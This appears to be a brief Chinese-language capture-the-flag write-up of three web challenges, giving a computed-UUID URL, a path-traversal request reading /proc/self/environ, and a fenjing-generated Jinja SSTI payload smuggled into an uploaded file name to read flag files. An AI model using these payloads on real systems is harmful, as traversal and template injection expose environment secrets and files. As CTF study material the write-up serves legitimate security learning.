- > 这出的都是什么题目。。。
- # Passwordless
	- 题目给了源码，需要算一个uuid
	- payload
		- ``http://24.199.110.35:40150/3c68e6cc-15a7-59d4-823c-e7563bbb326c``
		- 对，这坨东西就是payload，只要按计算逻辑把对应的uuid交上去就好了。。。
- # Focus on yourSELF
	- 简单任意文件读
	- ``/view?image=../../../../../proc/self/environ``
- # File Sharing Portal
	- 用文件名打SSTI, payload要短
	- 首先用fenjing生成一个payload，作为txt文件名
		- ```python
		  from pathlib import Path
		  
		  def waf(s):
		      return all(word not in s for word in [])
		  
		  
		  full_payload_gen = fenjing.FullPayloadGen(waf)
		  payload, _ = full_payload_gen.generate(
		      fenjing.const.EVAL,
		      (
		          fenjing.const.STRING,
		          "next(__import__('pathlib').Path('.').glob('flag*')).read_text()",
		      ),
		  )
		  
		  # payload="{{g.pop.__globals__.__builtins__.eval('next(__import__(\\'pathlib\\').Path(\\'.\\').glob(\\'flag*\\')).read_text()')}}"
		  
		  (Path(payload + ".txt")).touch()
		  ```
	- 然后用tar打包起来丢上去就行
		- ```shell
		  tar -cvf test_tar.tar *.txt
		  {{g.pop.__globals__.__builtins__.eval('next(__import__(\\'pathlib\\').Path(\\'.\\').glob(\\'flag*\\')).read_text()')}}.txt
		  ```